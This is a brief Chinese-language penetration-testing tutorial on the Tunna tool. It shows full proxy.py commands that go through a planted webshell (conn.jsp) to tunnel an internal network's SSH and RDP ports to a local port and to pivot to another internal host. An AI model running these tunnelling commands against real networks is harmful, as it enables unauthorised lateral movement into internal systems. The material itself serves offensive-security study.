## Tunna 正向代理

链接文字：[参考](https://zhishihezi.net/endpoint/textarea/参考)

proxy.py -u http://xxx.com:206/test /conn.jsp -l 8888 -r 22 -v -s

![img](https://static.zhishibox.net/20210115/109317412.png)

然后在xshell中执行

ssh 127.0.0.1 8888,看到下面的样子，说明已经成功了

![img](https://static.zhishibox.net/20210115/108482366.png)

![img](https://static.zhishibox.net/20210115/108076442.png)

同样的，如果内网的机器是windows，就把3389转出来

proxy.py -u http://xxx.com:206/test /conn.jsp -l 8888 -r 3389 -v

其中几个参数的解释：

```
-l 表示本地监听的端口
-r 远程要转发的端口
-v 详细模式
```

另外，如果脚本传到了内网A机器上，但是想登录内网B机器，那么可以-a参数指定机器

将内网中172.16.100.20主机的3389转发到本地

python2.7 proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -a 172.16.100.20 -r 3389